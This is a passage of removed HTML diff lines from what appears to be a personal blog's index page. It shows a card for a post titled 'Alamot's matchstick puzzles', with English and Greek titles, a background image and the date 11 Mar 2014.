-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
